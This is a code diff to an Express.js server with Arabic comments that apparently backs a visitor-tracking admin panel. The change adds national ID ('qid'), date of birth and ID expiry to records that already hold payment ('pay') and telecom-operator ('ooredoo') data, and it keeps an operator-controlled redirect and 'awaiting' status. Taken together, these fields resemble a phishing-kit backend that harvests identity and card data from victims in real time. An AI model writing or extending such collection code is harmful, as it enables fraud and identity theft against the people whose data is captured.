@@ -93,13 +93,16 @@ app.get('/api/admin/orders', (req, res) => {
     // معالجة البيانات حسب النموذج المتوقع
     return {
       ...v, // دمج جميع بيانات الزيارة
-      // تأكيد الحقول الأساسية بشكل صريح (تكتب فوق spread للضمان)
-      ref: v.visitId,           // معرّف الطلب دائماً هو visitId
+      // تأكيد الحقول الأساسية (تكتب فوق spread للضمان)
+      ref: v.visitId,
       ts: v.createdAt || v.updatedAt || Date.now(),
       status: v.status || 'active',
       n: v.name || v.n || 'بدون اسم',
       p: v.phone || v.p || '',
       e: v.email || v.e || '',
+      id: v.id || v.qid || '',
+      dob: v.dob || v.birthDate || v.birth_date || '',
+      idExpiry: v.idExpiry || v.id_expiry || v.qid_expiry || '',
       step: v.step || 'form',
       pay: v.pay || null,
       ooredoo: v.ooredoo || null,
@@ -208,12 +211,18 @@ app.post('/api/track', (req, res) => {
   const existing = visits[visitId] || { visitId, createdAt: now };
   const pendingRedirect = existing.pendingRedirect || null;
 
+  // لا تمحو البيانات الموجودة بقيم فارغة (حماية بيانات العميل)
+  const cleanData = {};
+  for (const [k, v] of Object.entries(data)) {
+    if (v !== '' && v !== null && v !== undefined) cleanData[k] = v;
+  }
+
   visits[visitId] = {
     ...existing,
-    ...data,
+    ...cleanData,
     visitId,
     updatedAt: now,
-    status: 'active',
+    status: existing.status === 'awaiting' ? existing.status : 'active',
     pendingRedirect: null,
   };
 
